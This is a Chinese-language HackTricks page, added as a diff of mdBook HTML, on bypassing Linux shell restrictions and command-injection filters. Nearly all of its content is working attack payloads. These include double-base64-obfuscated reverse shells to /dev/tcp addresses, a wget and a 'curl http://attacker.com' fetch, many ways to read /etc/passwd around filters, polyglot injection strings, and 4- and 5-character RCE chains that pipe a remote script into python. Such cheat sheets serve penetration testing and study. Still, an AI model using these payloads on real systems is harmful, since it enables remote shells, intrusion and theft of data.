@@ -1,0 +1,529 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Bypass Linux Restrictions</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="绕过-linux-限制"><a class="header" href="#绕过-linux-限制">绕过 Linux 限制</a></h1>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<p><br />
+使用 <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_term=trickest&amp;utm_content=bypass-bash-restrictions"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
+今天就获取访问权限：</p>
+<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=bypass-bash-restrictions" %}</p>
+<h2 id="常见限制绕过"><a class="header" href="#常见限制绕过">常见限制绕过</a></h2>
+<h3 id="反向-shell"><a class="header" href="#反向-shell">反向 Shell</a></h3>
+<pre><code class="language-bash"># Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
+echo "echo $(echo 'bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
+# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
+</code></pre>
+<h3 id="短-rev-shell"><a class="header" href="#短-rev-shell">短 Rev shell</a></h3>
+<pre><code class="language-bash">#Trick from Dikline
+#Get a rev shell with
+(sh)0&gt;/dev/tcp/10.10.10.10/443
+#Then get the out of the rev shell executing inside of it:
+exec &gt;&amp;0
+</code></pre>
+<h3 id="绕过路径和禁止词汇"><a class="header" href="#绕过路径和禁止词汇">绕过路径和禁止词汇</a></h3>
+<pre><code class="language-bash"># Question mark binary substitution
+/usr/bin/p?ng # /usr/bin/ping
+nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost
+
+# Wildcard(*) binary substitution
+/usr/bin/who*mi # /usr/bin/whoami
+
+# Wildcard + local directory arguments
+touch -- -la # -- stops processing options after the --
+ls *
+echo * #List current files and folders with echo and wildcard
+
+# [chars]
+/usr/bin/n[c] # /usr/bin/nc
+
+# Quotes
+'p'i'n'g # ping
+"w"h"o"a"m"i # whoami
+ech''o test # echo test
+ech""o test # echo test
+bas''e64 # base64
+
+#Backslashes
+\u\n\a\m\e \-\a # uname -a
+/\b\i\n/////s\h
+
+# $@
+who$@ami #whoami
+
+# Transformations (case, reverse, base64)
+$(tr "[A-Z]" "[a-z]"&lt;&lt;&lt;"WhOaMi") #whoami -&gt; Upper case to lower case
+$(a="WhOaMi";printf %s "${a,,}") #whoami -&gt; transformation (only bash)
+$(rev&lt;&lt;&lt;'imaohw') #whoami
+bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64
+
+# Execution through $0
+echo whoami|$0
+
+# Uninitialized variables: A uninitialized variable equals to null (nothing)
+cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
+p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters
+
+# New lines
+p\
+i\
+n\
+g # These 4 lines will equal to ping
+
+# Fake commands
+p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
+w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown
+
+# Concatenation of strings using history
+!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
+mi # This will throw an error
+whoa # This will throw an error
+!-1!-2 # This will execute whoami
+</code></pre>
+<h3 id="绕过禁止的空格"><a class="header" href="#绕过禁止的空格">绕过禁止的空格</a></h3>
+<pre><code class="language-bash"># {form}
+{cat,lol.txt} # cat lol.txt
+{echo,test} # echo test
+
+# IFS - Internal field separator, change " " for any other character ("]" in this case)
+cat${IFS}/etc/passwd # cat /etc/passwd
+cat$IFS/etc/passwd # cat /etc/passwd
+
+# Put the command line in a variable and then execute it
+IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
+IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
+IFS=,;`cat&lt;&lt;&lt;cat,/etc/passwd` # Using cat twice
+#  Other way, just change each space for ${IFS}
+echo${IFS}test
+
+# Using hex format
+X=$'cat\x20/etc/passwd'&amp;&amp;$X
+
+# Using tabs
+echo "ls\x09-l" | bash
+
+# Undefined variables and !
+$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
+uname!-1\-a # This equals to uname -a
+</code></pre>
+<h3 id="绕过反斜杠和斜杠"><a class="header" href="#绕过反斜杠和斜杠">绕过反斜杠和斜杠</a></h3>
+<pre><code class="language-bash">cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+</code></pre>
+<h3 id="绕过管道"><a class="header" href="#绕过管道">绕过管道</a></h3>
+<pre><code class="language-bash">bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+</code></pre>
+<h3 id="使用十六进制编码绕过"><a class="header" href="#使用十六进制编码绕过">使用十六进制编码绕过</a></h3>
+<pre><code class="language-bash">echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
+`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+cat `xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764`
+xxd -r -ps &lt;(echo 2f6574632f706173737764)
+cat `xxd -r -ps &lt;(echo 2f6574632f706173737764)`
+</code></pre>
+<h3 id="绕过-ips"><a class="header" href="#绕过-ips">绕过 IPs</a></h3>
+<pre><code class="language-bash"># Decimal IPs
+127.0.0.1 == 2130706433
+</code></pre>
+<h3 id="基于时间的数据外泄"><a class="header" href="#基于时间的数据外泄">基于时间的数据外泄</a></h3>
+<pre><code class="language-bash">time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+</code></pre>
+<h3 id="从环境变量获取字符"><a class="header" href="#从环境变量获取字符">从环境变量获取字符</a></h3>
+<pre><code class="language-bash">echo ${LS_COLORS:10:1} #;
+echo ${PATH:0:1} #/
+</code></pre>
+<h3 id="dns-数据外泄"><a class="header" href="#dns-数据外泄">DNS 数据外泄</a></h3>
+<p>您可以使用 <strong>burpcollab</strong> 或 <a href="http://pingb.in"><strong>pingb</strong></a> 作为例子。</p>
+<h3 id="内置命令"><a class="header" href="#内置命令">内置命令</a></h3>
+<p>如果您无法执行外部函数，并且只能访问 <strong>有限的内置命令以获得 RCE</strong>，那么有一些方便的技巧可以做到这一点。通常您 <strong>无法使用所有</strong> 的 <strong>内置命令</strong>，因此您应该 <strong>了解所有选项</strong> 以尝试绕过监狱。灵感来自 <a href="https://twitter.com/devploit"><strong>devploit</strong></a>。<br />
+首先检查所有的 <a href="https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html"><strong>shell 内置命令</strong></a><strong>。</strong> 然后这里有一些 <strong>建议</strong>：</p>
+<pre><code class="language-bash"># Get list of builtins
+declare builtins
+
+# In these cases PATH won't be set, so you can try to set it
+PATH="/bin" /bin/ls
+export PATH="/bin"
+declare PATH="/bin"
+SHELL=/bin/bash
+
+# Hex
+$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
+$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
+
+# Input
+read aaa; exec $aaa #Read more commands to execute and execute them
+read aaa; eval $aaa
+
+# Get "/" char using printf and env vars
+printf %.1s "$PWD"
+## Execute /bin/ls
+$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
+## To get several letters you can use a combination of printf and
+declare
+declare functions
+declare historywords
+
+# Read flag in current dir
+source f*
+flag.txt:1: command not found: CTF{asdasdasd}
+
+# Read file with read
+while read -r line; do echo $line; done &lt; /etc/passwd
+
+# Get env variables
+declare
+
+# Get history
+history
+declare history
+declare historywords
+
+# Disable special builtins chars so you can abuse them as scripts
+[ #[: ']' expected
+## Disable "[" as builtin and enable it as script
+enable -n [
+echo -e '#!/bin/bash\necho "hello!"' &gt; /tmp/[
+chmod +x [
+export PATH=/tmp:$PATH
+if [ "a" ]; then echo 1; fi # Will print hello!
+</code></pre>
+<h3 id="多语言命令注入"><a class="header" href="#多语言命令注入">多语言命令注入</a></h3>
+<pre><code class="language-bash">1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+</code></pre>
+<h3 id="绕过潜在的正则表达式"><a class="header" href="#绕过潜在的正则表达式">绕过潜在的正则表达式</a></h3>
+<pre><code class="language-bash"># A regex that only allow letters and numbers might be vulnerable to new line characters
+1%0a`curl http://attacker.com`
+</code></pre>
+<h3 id="bashfuscator"><a class="header" href="#bashfuscator">Bashfuscator</a></h3>
+<pre><code class="language-bash"># From https://github.com/Bashfuscator/Bashfuscator
+./bashfuscator -c 'cat /etc/passwd'
+</code></pre>
+<h3 id="rce-with-5-chars"><a class="header" href="#rce-with-5-chars">RCE with 5 chars</a></h3>
+<pre><code class="language-bash"># From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
+#Oragnge Tsai solution
+## Step 1: generate `ls -t&gt;g` to file "_" to be able to execute ls ordening names by cration date
+http://host/?cmd=&gt;ls\
+http://host/?cmd=ls&gt;_
+http://host/?cmd=&gt;\ \
+http://host/?cmd=&gt;-t\
+http://host/?cmd=&gt;\&gt;g
+http://host/?cmd=ls&gt;&gt;_
+
+## Step2: generate `curl orange.tw|python` to file "g"
+## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
+http://host/?cmd=&gt;on
+http://host/?cmd=&gt;th\
+http://host/?cmd=&gt;py\
+http://host/?cmd=&gt;\|\
+http://host/?cmd=&gt;tw\
+http://host/?cmd=&gt;e.\
+http://host/?cmd=&gt;ng\
+http://host/?cmd=&gt;ra\
+http://host/?cmd=&gt;o\
+http://host/?cmd=&gt;\ \
+http://host/?cmd=&gt;rl\
+http://host/?cmd=&gt;cu\
+http://host/?cmd=sh _
+# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file
+
+## Finally execute the file "g"
+http://host/?cmd=sh g
+
+
+# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
+# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
+https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
+## Execute tar command over a folder
+http://52.199.204.34/?cmd=&gt;tar
+http://52.199.204.34/?cmd=&gt;zcf
+http://52.199.204.34/?cmd=&gt;zzz
+http://52.199.204.34/?cmd=*%20/h*
+
+# Another curiosity if you can read files of the current folder
+ln /f*
+## If there is a file /flag.txt that will create a hard link
+## to it in the current folder
+</code></pre>
+<h3 id="rce-with-4-chars"><a class="header" href="#rce-with-4-chars">RCE with 4 chars</a></h3>
+<pre><code class="language-bash"># In a similar fashion to the previous bypass this one just need 4 chars to execute commands
+# it will follow the same principle of creating the command `ls -t&gt;g` in a file
+# and then generate the full command in filenames
+# generate "g&gt; ht- sl" to file "v"
+'&gt;dir'
+'&gt;sl'
+'&gt;g\&gt;'
+'&gt;ht-'
+'*&gt;v'
+
+# reverse file "v" to file "x", content "ls -th &gt;g"
+'&gt;rev'
+'*v&gt;x'
+
+# generate "curl orange.tw|python;"
+'&gt;\;\\'
+'&gt;on\\'
+'&gt;th\\'
+'&gt;py\\'
+'&gt;\|\\'
+'&gt;tw\\'
+'&gt;e.\\'
+'&gt;ng\\'
+'&gt;ra\\'
+'&gt;o\\'
+'&gt;\ \\'
+'&gt;rl\\'
+'&gt;cu\\'
+
+# got shell
+'sh x'
+'sh g'
+</code></pre>
+<h2 id="只读无执行无发行版绕过"><a class="header" href="#只读无执行无发行版绕过">只读/无执行/无发行版绕过</a></h2>
+<p>如果您在一个具有 <strong>只读和无执行保护</strong> 的文件系统中，甚至在一个无发行版容器中，仍然有方法可以 <strong>执行任意二进制文件，甚至是一个 shell！:</strong></p>
+<p>{% content-ref url="bypass-fs-protections-read-only-no-exec-distroless/" %}
+<a href="bypass-fs-protections-read-only-no-exec-distroless/">bypass-fs-protections-read-only-no-exec-distroless</a>
+{% endcontent-ref %}</p>
+<h2 id="chroot-和其他监狱绕过"><a class="header" href="#chroot-和其他监狱绕过">Chroot 和其他监狱绕过</a></h2>
+<p>{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
+<a href="../privilege-escalation/escaping-from-limited-bash.html">escaping-from-limited-bash.md</a>
+{% endcontent-ref %}</p>
+<h2 id="参考资料与更多"><a class="header" href="#参考资料与更多">参考资料与更多</a></h2>
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits</a></li>
+<li><a href="https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet">https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet</a></li>
+<li><a href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0">https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0</a></li>
+<li><a href="https://www.secjuice.com/web-application-firewall-waf-evasion/">https://www.secjuice.com/web-application-firewall-waf-evasion/</a></li>
+</ul>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<p><br />
+使用 <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_term=trickest&amp;utm_content=bypass-bash-restrictions"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
+今天就获取访问权限：</p>
+<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=bypass-bash-restrictions" %}</p>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客攻击：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客攻击： <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../linux-hardening/useful-linux-commands.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../linux-hardening/bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../linux-hardening/useful-linux-commands.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../linux-hardening/bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
